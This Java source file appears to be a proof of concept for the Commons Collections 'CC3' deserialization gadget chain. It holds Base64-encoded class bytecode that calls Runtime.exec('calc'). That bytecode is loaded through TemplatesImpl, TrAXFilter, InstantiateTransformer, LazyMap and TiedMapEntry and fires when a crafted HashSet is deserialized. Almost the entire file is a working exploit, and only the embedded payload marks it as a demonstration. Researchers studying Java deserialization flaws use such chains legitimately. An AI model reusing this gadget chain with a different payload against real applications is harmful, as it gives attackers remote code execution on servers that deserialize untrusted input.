package org.example.CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
* HashSet.readObject()
*  ->HashMap.readObject()
*   ->HashMap.hash()
*    ->TideMapEntry.hashCode()
*     ->TideMapEntry.getValue()
*      ->LazyMap.get()
*       ->ChainedTransformer.transform()
*        ->InstantiateTransformer.transform()
*         ->TrAXFilter.TrAXFilter()
*          ->TemplatesImpl.newTransformer()
*           ->TemplatesImpl.getTransletInstance()
*            ->TemplatesImpl.defineTransletClasses()
*             ->TemplatesImpl$TransletClassLoader.defineClass()
* */

public class CC3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void testTemplatesImpl() throws Exception {
        // source: HelloTemplateImpl.java
        byte[] code =
                Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA" +
                                "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
                                "TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0" +
                                "aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm" +
                                "KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y" +
                                "Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw" +
                                "YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp" +
                                "bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb" +
                                "DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB" +
                                "AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj" +
                                "dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z" +
                                "bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry" +
                                "ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n" +
                                "OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA" +
                                "AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA" +
                                "AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA" +
                                "DwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }
    public static void main(String[] args) throws Exception {
        ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{});
        byte[] CalcCode = Base64.getDecoder().decode(
                "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                        "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
                        "TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a" +
                        "W9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKEx" +
                        "jb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hc" +
                        "GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS9" +
                        "4bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAA" +
                        "ygpVgcAGwEAClNvdXJjZUZpbGUBABBUZW1wbGF0ZVBPQy5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGM" +
                        "MAB8AIAEAC1RlbXBsYXRlUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzb" +
                        "HRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnR" +
                        "lcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL" +
                        "2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQA" +
                        "nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIA" +
                        "AIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAA" +
                        "ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA" +
                        "bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl calcTemp = new TemplatesImpl();
        setFieldValue(calcTemp, "_bytecodes", new byte[][] {CalcCode});
        setFieldValue(calcTemp, "_name", "CalcTemplatesImpl");
        setFieldValue(calcTemp, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{calcTemp})
        };

        // CC6前半段,高版本jdk利用
        Map lazyMap = LazyMap.decorate(new HashMap<>(),transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        Map tiedMap = new HashMap<>();
        tiedMap.put(tiedMapEntry,"Exp");
        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMap);
        lazyMap.remove("key");

        setFieldValue(transformerChain,"iTransformers",transformers);

        // 测试
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashSet);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}

